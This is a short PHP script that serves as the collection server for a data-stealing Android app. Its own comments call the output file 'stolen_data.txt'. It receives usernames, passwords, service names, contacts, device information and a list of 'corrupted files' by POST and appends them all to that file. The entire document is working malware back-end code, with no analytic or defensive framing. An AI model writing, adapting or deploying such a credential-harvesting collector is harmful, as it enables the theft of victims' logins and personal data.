<?php
// File to save stolen data
$file = 'stolen_data.txt';

// Get the current date and time
$date = date('Y-m-d H:i:s');

// Collect data sent via POST
$data = "=== Data Received at $date ===\n";

// Get login credentials if sent
if(isset($_POST['username']) && isset($_POST['password'])) {
    $data .= "Login Credentials:\n";
    $data .= "Username: " . $_POST['username'] . "\n";
    $data .= "Password: " . $_POST['password'] . "\n";
    $data .= "Service: " . (isset($_POST['service']) ? $_POST['service'] : 'Unknown') . "\n\n";
}

// Get contacts if sent
if(isset($_POST['contacts'])) {
    $data .= "Contacts:\n" . $_POST['contacts'] . "\n\n";
}

// Get device info if sent
if(isset($_POST['device_info'])) {
    $data .= "Device Information:\n" . $_POST['device_info'] . "\n\n";
}

// Get file list if sent
if(isset($_POST['files'])) {
    $data .= "Corrupted Files List:\n" . $_POST['files'] . "\n\n";
}

// Append to file
file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

// Send response back to Android app
echo "Data received successfully";
?>
